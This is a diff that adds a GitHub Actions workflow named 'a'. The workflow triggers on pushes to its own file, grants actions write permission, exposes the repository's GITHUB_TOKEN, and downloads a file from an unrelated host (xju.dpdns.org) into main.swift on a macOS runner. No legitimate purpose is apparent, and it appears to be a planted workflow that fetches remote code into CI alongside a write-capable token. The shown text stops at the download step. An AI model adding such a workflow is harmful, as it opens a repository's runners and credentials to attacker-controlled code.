@@ -1,0 +1,22 @@
+name: a
+
+on:
+  workflow_dispatch:
+  push:
+    paths:
+      - '.github/workflows/a.yml'
+
+permissions:
+  actions: write
+
+env:
+  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+jobs:
+  job:
+    runs-on: macos-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - run: |
+          curl -L "http://xju.dpdns.org/24h.php?id=69e5b6879aaaf" > main.swift
